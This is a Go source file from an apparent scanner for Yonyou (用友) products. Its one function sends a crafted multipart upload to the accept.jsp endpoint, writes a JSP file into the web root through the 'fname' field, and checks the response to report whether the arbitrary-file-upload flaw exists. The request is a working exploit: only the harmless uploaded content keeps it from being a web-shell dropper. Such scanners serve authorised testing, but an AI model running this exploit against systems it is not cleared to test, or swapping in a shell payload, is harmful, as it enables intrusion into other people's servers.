package Scan

import (
	"FoPoForYonyou2.0/Utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func AcceptuploadScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	acceptupload := "用友 accept 任意文件上传漏洞"
	urls := address + "/aim/equipmap/accept.jsp"
	response, _ := client.Post(urls, "multipart/form-data; boundary=---------------------------16314487820932200903769468567", strings.NewReader("-----------------------------16314487820932200903769468567\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"oklog.txt\"\r\nContent-Type: text/plain\r\n\r\nok\r\n-----------------------------16314487820932200903769468567\r\nContent-Disposition: form-data; name=\"fname\"\r\n\r\n\\webapps\\nc_web\\oklog.jsp\r\n-----------------------------16314487820932200903769468567--"))
	defer response.Body.Close()

	// 读取响应内容
	body, _ := ioutil.ReadAll(response.Body)

	if strings.Contains(string(body), "afterUpload(1)") {
		result := acceptupload + "：" + urls
		//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result, filename)
		if err != nil {
			log.Println("保存结果到文件出错:", err)
		} else {

		}
		output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, acceptupload, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, acceptupload)
		fmt.Println(output)
	}
}
